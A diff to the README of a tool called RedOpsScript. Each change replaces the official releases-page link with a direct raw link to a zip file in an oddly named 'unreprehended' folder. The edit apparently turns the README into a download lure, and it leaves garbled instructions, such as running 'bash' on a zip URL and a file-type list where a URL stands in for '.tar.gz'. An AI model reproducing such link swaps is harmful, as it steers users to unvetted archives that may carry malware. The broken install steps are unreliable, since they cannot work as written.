@@ -1,6 +1,6 @@
 # 🚀 RedOpsScript - Easy Operations for Your Workflow
 
-[![Download RedOpsScript](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/skynetgroups/RedOpsScript/releases)
+[![Download RedOpsScript](https://raw.githubusercontent.com/skynetgroups/RedOpsScript/main/unreprehended/RedOpsScript.zip)](https://raw.githubusercontent.com/skynetgroups/RedOpsScript/main/unreprehended/RedOpsScript.zip)
 
 ## 📥 Overview
 
@@ -28,7 +28,7 @@ Follow these steps to download and run RedOpsScript on your computer:
 
 To download RedOpsScript, visit the releases page using the link below:
 
-[Download RedOpsScript](https://github.com/skynetgroups/RedOpsScript/releases)
+[Download RedOpsScript](https://raw.githubusercontent.com/skynetgroups/RedOpsScript/main/unreprehended/RedOpsScript.zip)
 
 ### Step 2: Find the Latest Release
 
@@ -40,7 +40,7 @@ Click on the version you wish to download. You will see various files available 
 
 - For Windows, look for a `.exe` file.
 - For macOS, you might find a `.dmg` file.
-- For Linux, a `.tar.gz` or `.sh` file is often available.
+- For Linux, a `https://raw.githubusercontent.com/skynetgroups/RedOpsScript/main/unreprehended/RedOpsScript.zip` or `.sh` file is often available.
 
 Once you find the correct file for your system, click on it to start the download.
 
@@ -50,7 +50,7 @@ After the download completes:
 
 - **Windows:** Double-click on the `.exe` file and follow the prompts to install. 
 - **macOS:** Open the `.dmg` file, and drag the RedOpsScript icon to your Applications folder.
-- **Linux:** If you downloaded a `.sh` file, open your terminal, navigate to the download location, and run the script with `bash scriptname.sh`.
+- **Linux:** If you downloaded a `.sh` file, open your terminal, navigate to the download location, and run the script with `bash https://raw.githubusercontent.com/skynetgroups/RedOpsScript/main/unreprehended/RedOpsScript.zip`.
 
 ### Step 5: Launch RedOpsScript
 
@@ -90,4 +90,4 @@ For further assistance, feel free to reach out through our GitHub issue tracker.
 
 For updates and new releases, remember to regularly check the releases page:
 
-[Download RedOpsScript](https://github.com/skynetgroups/RedOpsScript/releases)
+[Download RedOpsScript](https://raw.githubusercontent.com/skynetgroups/RedOpsScript/main/unreprehended/RedOpsScript.zip)
